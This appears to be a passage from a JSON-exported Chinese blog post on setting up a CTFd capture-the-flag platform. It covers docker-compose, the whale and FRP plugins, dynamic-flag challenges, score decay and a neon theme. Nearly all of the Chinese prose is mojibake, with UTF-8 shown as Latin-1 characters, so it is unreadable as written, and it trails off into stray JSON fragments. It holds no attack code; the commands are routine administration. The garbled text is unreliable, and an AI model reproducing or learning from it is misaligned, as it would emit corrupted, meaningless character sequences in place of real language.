#ä½¿ç”¨docker-composeä¸‹è½½é•œåƒç”Ÿæˆå®¹å™¨å¹¶å¯åŠ¨å®¹å™¨ æ„å»ºåä½ å¯ä»¥çœ‹ä¸€ä¸‹æ˜¯å¦æ„å»ºå®Œæˆï¼š 1docker ps -a #æŸ¥çœ‹å®¹å™¨çŠ¶æ€ å­˜åœ¨ä¸€ä¸ªdockeré•œåƒäº† ç®¡ç†å‘˜ç‚¹å‡»è¿›å…¥Admin Panel ç®¡ç†ç•Œé¢ï¼šç‚¹å‡»whale:ç‚¹å‡» Frp å¡«å…¥æœåŠ¡å™¨ ip submit ä¿å­˜ä¸€æ‰‹ï¼Œè¿›å…¥challengesç•Œé¢ï¼šç‚¹å‡»ä¸Šé¢çš„åŠ å·ï¼šï¼Œè¿™é‡Œéƒ¨ç½² web æ‰€ä»¥é€‰æ‹©åŠ¨æ€ flagï¼Œé€‰æ‹©dynamic(å¦‚æœä½ è¦æ˜¯åªè¦é™æ€çš„flag,é‚£ä½ å°±ç”¨standardæ ‡å‡†å°±è¡Œäº†) è¿™è¾¹docker image å°±æ˜¯ä½ æœ¬åœ°æ„å»ºé•œåƒçš„åå­—ï¼Œå¦‚æœä¸å­˜åœ¨æœ¬åœ°é•œåƒä¼šè‡ªåŠ¨è°ƒç”¨dockerhubä¸Šé¢çš„åœ¨çº¿é•œåƒå†…å®¹ ç„¶åFRP port çš„å†…å®¹ä½ å°±å¡«80 è¿™ä¸ªæ˜¯é…ç½®çš„é»˜è®¤è½¬å‘æ¥å£ï¼Œæ²¡ç»‘åŸŸåçš„è¯ Type é€‰æ‹© directã€‚ ç„¶åå°±æ˜¯åˆ†æ•°è¡°å‡æœ€å¤§åˆ†æœ€å°åˆ† ctfd ç¾åŒ–åœ¨ CTFd&#x2F;CTFd&#x2F;themes ä¸‹æ‹‰å–ä¸»é¢˜å³å¯ 1git clone https://githubfast.com/chainflag/ctfd-neon-theme.git ç„¶ååœ¨ theme é¡µé¢è®¾ç½®ã€‚","tags":["ctf"],"categories":["CTF"]}]